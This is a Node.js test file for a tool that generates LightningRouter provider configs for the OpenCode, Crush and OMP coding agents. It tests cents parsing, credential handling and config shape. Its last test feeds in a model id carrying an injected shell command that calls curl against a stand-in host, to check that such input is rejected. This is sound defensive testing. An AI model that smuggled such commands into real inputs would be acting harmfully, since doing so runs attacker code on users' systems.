import assert from "node:assert/strict";
import test from "node:test";
import { centsFromText, setupFor } from "../setup.mjs";

const model = { id: "deepseek/deepseek-flash", name: "DeepSeek Flash", context: 128000, output: 8192 };
const base = "https://api.lightningrouter.ai/v1";

for (const [text, cents] of [["10", 1000], ["0.01", 1], ["5.5", 550], ["1000.00", 100000]]) {
  test(`exact cents ${text}`, () => assert.equal(centsFromText(text), cents));
}
for (const text of ["0", "1e2", "1.001", "Infinity", "-1", "1000.01", "1abc", ""]) {
  test(`reject invalid money ${text}`, () => assert.throws(() => centsFromText(text)));
}
for (const agent of ["opencode", "crush", "omp"]) {
  test(`${agent} has exact endpoint/model and environment-only credential`, () => {
    const result = setupFor(agent, model, base);
    assert.ok(result.config.includes(base));
    assert.ok(result.config.includes(model.id));
    assert.ok(result.config.includes("LIGHTNINGROUTER_API_KEY"));
    assert.ok(!result.config.includes("sk-lr-"));
    assert.ok(!result.config.includes("openrouter.ai"));
  });
}
test("OpenCode shape", () => {
  const json = JSON.parse(setupFor("opencode", model, base).config);
  assert.equal(json.provider.lightningrouter.npm, "@ai-sdk/openai-compatible");
  assert.equal(json.model, "lightningrouter/" + model.id);
});
test("Crush selects the custom provider", () => {
  const json = JSON.parse(setupFor("crush", model, base).config);
  assert.equal(json.models.large.provider, "lightningrouter");
  assert.equal(json.providers.lightningrouter.type, "openai-compat");
});
test("OMP uses current YAML file and explicit bearer", () => {
  const result = setupFor("omp", model, base);
  assert.equal(result.path, "~/.omp/agent/models.yml");
  assert.ok(result.config.includes("authHeader: true"));
});
test("model change updates every config", () => {
  for (const agent of ["opencode", "crush", "omp"]) {
    const result = setupFor(agent, { ...model, id: "kimi/kimi-k2.7" }, base);
    assert.ok(!result.config.includes(model.id));
    assert.ok(result.config.includes("kimi/kimi-k2.7"));
  }
});
test("malicious model cannot escape shell commands", () => {
  assert.throws(() => setupFor("omp", { ...model, id: "x'; curl evil.test" }, base));
});
